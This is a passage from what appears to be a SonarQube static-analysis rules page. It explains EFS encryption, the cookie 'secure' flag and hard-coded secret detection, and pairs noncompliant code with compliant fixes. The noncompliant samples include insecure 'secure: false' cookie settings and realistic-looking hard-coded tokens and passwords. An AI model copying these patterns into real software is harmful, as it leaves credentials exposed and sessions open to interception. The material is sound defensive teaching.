    vpc: new Vpc(this, &#39;VPC&#39;),
    encrypted: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_efs.CfnFileSystem.html" rel="nofollow"><code>aws_cdk.aws_efs.CfnFileSystem</code></a></p>
<pre>
import { CfnFileSystem } from &#39;aws-cdk-lib/aws-efs&#39;;

new CfnFileSystem(this, &#39;encrypted-explicit-cfn&#39;, {
    encrypted: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">AWS Documentation</a> - Data encryption in Amazon EFS </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2092">
              javascript:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  secure: false,// Sensitive
});  // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    secure: false // Sensitive
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  secure: false // Sensitive
}); // Sensitive
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { secure: false }}); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/cookie-session" rel="nofollow">cookie-session</a> module:</p>
<pre>
let session &#61; cookieSession({
  secure: true,// Compliant
});  // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/express-session" rel="nofollow">express-session</a> module:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const session &#61; require(&#39;express-session&#39;);

let app &#61; express();
app.use(session({
  cookie:
  {
    secure: true // Compliant
  }
}));
</pre>
<p><a href="https://www.npmjs.com/package/cookies" rel="nofollow">cookies</a> module:</p>
<pre>
let cookies &#61; new Cookies(req, res, { keys: keys });

cookies.set(&#39;LastVisit&#39;, new Date().toISOString(), {
  secure: true // Compliant
}); // Compliant
</pre>
<p><a href="https://www.npmjs.com/package/csurf" rel="nofollow">csurf</a> module:</p>
<pre>
const cookieParser &#61; require(&#39;cookie-parser&#39;);
const csrf &#61; require(&#39;csurf&#39;);
const express &#61; require(&#39;express&#39;);

let csrfProtection &#61; csrf({ cookie: { secure: true }}); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6701">
              secrets:S6701
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Telegram bot keys are used to authenticate and authorize a bot to interact with the Telegram Bot API. These keys are essentially access tokens that
allow the bot to send and receive messages, manage groups and channels, and perform other actions on behalf of the bot.</p>
<p>If a Telegram bot key is accidentally exposed to an unintended audience, the primary concern is that unauthorized individuals may gain access to
the bot’s functionalities and data. This could result in misuse or abuse of the bot’s capabilities. For instance, unauthorized users could send
unsolicited messages, spam users, or engage in other disruptive activities using the bot.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;api_token&#34;, &#34;7299363101:AAWJlilLyeMaKgTTrrfsyrtxDqqI-cdI-TF&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;api_token&#34;, System.getenv(&#34;API_TOKEN&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6700">
              secrets:S6700
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A RapidAPI key is a unique identifier that allows you to access and use APIs provided by RapidAPI. This key is used to track your API usage, manage
your subscriptions, and ensure that you have the necessary permissions to access the APIs you are using. One RapidAPI key can be used to authenticate
against a set of multiple other third-party services, depending on the key entitlement.</p>
<p>If a RapidAPI key leaks to an unintended audience, it can have several potential consequences. Especially, attackers may use the leaked key to
access and utilize the APIs associated with that key without permission. This can result in unauthorized usage of API services, potentially leading to
misuse, abuse, or excessive consumption of resources.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>RapidAPI services include an audit trail feature that can be used to audit malicious use of the compromised key.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;rapidapi_key&#34;, &#34;6f1bbe24b9mshcbb5030202794a4p18f7d0jsndd55ab0f981d&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;rapidapi_key&#34;, System.getenv(&#34;rapidapi_key&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> RapidAPI Documentation - <a href="https://docs.rapidapi.com/docs/keys#creating-or-rotating-a-rapid-api-key" rel="nofollow">Creating or rotating a Rapid API
  key</a> </li><li> RapidAPI Documentation - <a href="https://docs.rapidapi.com/docs/audit-trails" rel="nofollow">Audit Trails</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6689">
              secrets:S6689
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>GitHub tokens are used for authentication and authorization purposes when interacting with the GitHub API. They serve as a way to identify and
authenticate users or applications that are making requests to the GitHub API.</p>
<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Application’s security downgrade</h4>
<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the
affected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting
server or another linked component.</p>
<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.
An attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;token&#34;, &#34;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&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;token&#34;, System.getenv(&#34;TOKEN&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<p>GitHub documentation - <a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens" rel="nofollow">Managing your personal
access tokens</a></p>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6703">
              secrets:S6703
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>Passwords are often used to authenticate users against database engines. They are associated with user accounts that are granted specific
permissions over the database and its hosted data.</p>
<p>If a database password leaks to an unintended audience, it can have serious consequences for the security of your database instance, the data
stored within it, and the applications that rely on it.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h4>Security downgrade</h4>
<p>Applications relying on a database instance can suffer a security downgrade if an access password is leaked to attackers. Depending on the purposes
the application uses the database for, consequences can range from low-severity issues, like defacement, to complete compromise.</p>
<p>For example, if the database instance is used as part of the authentication process of an application, attackers with access to the database will
likely be able to bypass this security mechanism.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public static string ConnectionString &#61; &#34;server&#61;database-server;uid&#61;user;pwd&#61;P&#64;ssw0rd;database&#61;ProductionData&#34;;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public static string ConnectionString &#61; String.format(
    &#34;server&#61;database-server;uid&#61;user;pwd&#61;%s;database&#61;ProductionData&#34;,
    System.getenv(&#34;DB_PASSWORD&#34;)
)
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6702">
              secrets:S6702
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A SonarQube token is a unique key that serves as an authentication mechanism for accessing the SonarQube platform’s APIs. It is used to securely
authenticate and authorize external tools or services to interact with SonarQube.</p>
<p>Tokens are typically generated for specific users or applications and can be configured with different levels of access permissions. By using a
token, external tools or services can perform actions such as analyzing code, retrieving analysis results, creating projects, or managing quality
profiles within SonarQube.</p>
<p>If a SonarQube token leaks to an unintended audience, it can pose a security risk to the SonarQube instance and the associated projects. Attackers
may use the leaked token to gain unauthorized access to the SonarQube instance. They can potentially view sensitive information, modify project
settings, or perform other dangerous actions.</p>
<p>Additionally, attackers with access to a token can modify code analysis results. This can lead to false positives or negatives in the analysis,
compromising the accuracy and reliability of the platform.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Analyze recent secret use</strong></p>
<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will
allow determining if an attacker took advantage of the leaked secret and to what extent.</p>
<p>This operation should be part of a global incident response process.</p>
<p>The SonarQube audit log can be downloaded from the product web interface and can be used to audit the malicious use of the compromised key. This
feature is available starting with SonarQube Enterprise Edition.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;sonar_secret&#34;, &#34;squ_b4556a16fa2d28519d2451a911d2e073024010bc&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;sonar_secret&#34;, System.getenv(&#34;SONAR_SECRET&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> SonarQube Documentation - <a href="https://docs.sonarsource.com/sonarqube/latest/user-guide/user-account/generating-and-using-tokens/" rel="nofollow">Generating and using tokens</a> </li><li> SonarQube Documentation - <a href="https://docs.sonarsource.com/sonarqube/latest/instance-administration/security/" rel="nofollow">Security</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6686">
              secrets:S6686
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Clarifai API key leaks to an unintended audience, it could potentially lead to unauthorized access to the Clarifai account and its associated
data. This could result in the compromise of sensitive data or financial loss.</p>
<h4>Financial loss</h4>
<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of
client applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own
need, including in a way that was not expected.</p>
<p>This additional use of the secret will lead to added costs with the service provider.</p>
<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected
application. This might result in a partial denial of service for all the application’s users.</p>
<h4>Compromise of sensitive data</h4>
<p>If the affected service is used to store or process personally identifiable information or other sensitive data, attackers knowing an
authentication secret could be able to access it. Depending on the type of data that is compromised, it could lead to privacy violations, identity
theft, financial loss, or other negative outcomes.</p>
<p>In most cases, a company suffering a sensitive data compromise will face a reputational loss when the security issue is publicly disclosed.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from clarifai_grpc.grpc.api.status import status_code_pb2

metadata &#61; ((&#39;authorization&#39;,&#39;Key d819f799b90bc8dbaffd83661782dbb7&#39;),)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os
from clarifai_grpc.grpc.api.status import status_code_pb2

metadata &#61; ((&#39;authorization&#39;,os.environ[&#34;CLARIFAI_API_KEY&#34;]),)
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6688">
              secrets:S6688
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>A Facebook application secret key is a unique authentication token assigned to a Facebook application. It is used to authenticate and authorize the
application to access Facebook’s APIs and services. This key is required to perform actions on Facebook API, such as retrieving user data, posting on
behalf of users, or accessing various Facebook features.</p>
<p>If a Facebook application secret key leaks to an unintended audience, it can have serious security-related consequences both for the associated
Facebook application and its users. Especially, attackers knowing an application’s secret key will be able to access users&#39; data that the application
has been granted access to.</p>
<p>This can represent a severe confidentiality loss for Personally Identifiable Information. This might be against national regulatory requirements in
some countries.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
props.set(&#34;facebook_secret&#34;, &#34;a569a8eee3802560e1416edbc4ee119d&#34;)
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
props.set(&#34;facebook_secret&#34;, System.getenv(&#34;FACEBOOK_SECRET&#34;))
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> Facebook documentation - <a href="https://developers.facebook.com/docs/facebook-login/security" rel="nofollow">Login Security</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6687">
              secrets:S6687
            </a>
          </td>
          <td>
            <details>
              <p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source
code is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get
exposed to an unintended audience.</p>
<h2>Why is this an issue?</h2>
<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.
Unintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated
services or resources.</p>
<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>
<h3>What is the potential impact?</h3>
<p>If a Django secret key leaks to an unintended audience, it can have serious security implications for the corresponding application. The secret key
is used to sign cookies and other sensitive data so that an attacker could potentially use it to perform malicious actions.</p>
<p>For example, an attacker could use the secret key to create their own cookies that appear to be legitimate, allowing them to bypass authentication
and gain access to sensitive data or functionality.</p>
<p>In the worst-case scenario, an attacker could be able to execute arbitrary code on the application and take over its hosting server.</p>
<h2>How to fix it</h2>
<p><strong>Revoke the secret</strong></p>
<p>Revoke any leaked secrets and remove them from the application source code.</p>
<p>Before revoking the secret, ensure that no other applications or processes is using it. Other usages of the secret will also be impacted when the
secret is revoked.</p>
<p>In Django, changing the secret value is sufficient to invalidate any data that it protected. It is important to not add the revoked secret to the
<code>SECRET_KEY_FALLBACKS</code> list. Doing so would not prevent previously protected data from being used.</p>
<p><strong>Use a secret vault</strong></p>
<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected
disclosure.</p>
<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
SECRET_KEY &#61; &#39;r&amp;lvybzry1*k&#43;qq)&#61;x-!&#61;0yd5l5#1gxzk!82&#64;ru25*ntos3_9^&#39;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import os

SECRET_KEY &#61; os.environ[&#34;SECRET_KEY&#34;]
</pre>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">CWE-798 - Use of Hard-coded Credentials</a> </li><li> MITRE - <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">CWE-259 - Use of Hard-coded Password</a> </li><li> SANS - <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">TOP 25 Most Dangerous Software Errors</a> </li></ul>
<h3>Documentation</h3>
<ul><li> <a href="https://docs.djangoproject.com/en/4.2/ref/settings/#std-setting-SECRET_KEY" rel="nofollow">Django documentation</a> - Settings - SECRET_KEY </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=secrets:S6705">
              secrets:S6705
            </a>
          </td>
          <td>
            <details>
